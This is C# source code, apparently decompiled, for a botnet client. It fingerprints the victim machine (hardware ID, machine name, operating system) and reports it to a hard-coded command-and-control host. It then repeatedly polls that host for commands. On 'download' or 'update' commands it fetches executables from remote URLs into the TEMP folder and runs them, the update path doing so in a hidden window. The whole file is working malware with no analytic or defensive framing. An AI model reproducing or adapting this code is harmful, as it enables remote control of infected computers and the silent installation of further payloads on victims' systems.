using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace _2012;

internal class x0_con
{
	private static HttpWebRequest wReq;

	private static WebResponse wRes;

	private static string coldcmd = string.Empty;

	private static bool start = false;

	public static void conectar()
	{
		try
		{
			if (!start)
			{
				m0();
				m1();
			}
			else
			{
				start = false;
				m0();
				m1();
			}
		}
		catch (Exception)
		{
			Thread.Sleep(60000);
			conectar();
		}
	}

	private static void m0()
	{
		string datos = "mode=0&hwid=" + x0_inf.inf_uid() + "&pcname=" + Environment.MachineName + "&version=3&system=" + x0_inf.inf_SO() + "&flags=" + x0_inf.inf_flags();
		while (true)
		{
			try
			{
				string text = hr(datos);
				if (text.Length > 0)
				{
					if (text == "pexp3xp0xpox")
					{
						break;
					}
				}
				else
				{
					Thread.Sleep(60000);
					conectar();
				}
			}
			catch (Exception)
			{
				Thread.Sleep(60000);
				conectar();
			}
			x0_fnc.Flush();
			Thread.Sleep(60000);
		}
	}

	private static void m1()
	{
		string datos = "mode=1&hwid=" + x0_inf.inf_uid();
		start = true;
		while (start)
		{
			try
			{
				string text = hr(datos);
				if (text.Length > 0)
				{
					if (text != string.Empty)
					{
						execmd(text);
						coldcmd = text;
					}
				}
				else
				{
					coldcmd = string.Empty;
				}
			}
			catch (Exception)
			{
				Thread.Sleep(60000);
				conectar();
			}
			x0_fnc.Flush();
			Thread.Sleep(300000);
		}
	}

	private static string hr(string datos)
	{
		ServicePointManager.Expect100Continue = false;
		wReq = (HttpWebRequest)WebRequest.Create("http://www3.j03h.com?" + datos);
		wReq.ContentType = "application/x-www-form-urlencoded";
		wReq.UserAgent = "pexp3xp0xpox";
		wRes = wReq.GetResponse();
		if (wRes == null)
		{
			wRes.Close();
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(wRes.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private static void execmd(string xcmd)
	{
		string[] array = new string[0];
		try
		{
			array = xcmd.Split(new char[1] { '*' });
		}
		catch
		{
		}
		switch (array[0])
		{
		case "update":
		{
			string text2 = Convert.ToString(array[1]);
			string sVER = Convert.ToString(array[2]);
			if (!text2.StartsWith("http://"))
			{
				text2 = "http://" + text2;
			}
			xubot(text2, sVER);
			break;
		}
		case "download":
			try
			{
				string text = x0_fnc.gstring(new Random().Next(5, 12)) + ".exe";
				new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		}
	}

	private static void xubot(string xfilea, string sVER)
	{
		if (sVER != "3")
		{
			try
			{
				x0_str.xmux.Close();
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			try
			{
				string text = x0_fnc.gstring(new Random().Next(5, 12)) + ".exe";
				new WebClient().DownloadFile(xfilea, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			catch (Exception)
			{
			}
			Environment.Exit(0);
		}
	}
}
